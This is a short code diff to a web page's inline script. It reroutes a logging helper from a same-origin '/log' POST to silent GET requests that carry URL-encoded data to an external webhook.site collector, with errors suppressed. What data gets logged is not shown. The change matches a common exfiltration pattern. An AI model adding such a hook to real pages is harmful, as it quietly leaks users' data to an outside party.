@@ -3,13 +3,10 @@
 <body>
 <script>
 (async () => {
+  const WEBHOOK = 'https://webhook.site/dbeb210c-15ea-4443-9c13-7d0c39240ec0/log';
   const log = async (obj) => {
     try {
-      await fetch('/log', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(obj),
-      });
+      await fetch(WEBHOOK + '?d=' + encodeURIComponent(JSON.stringify(obj)));
     } catch (e) {}
   };
 
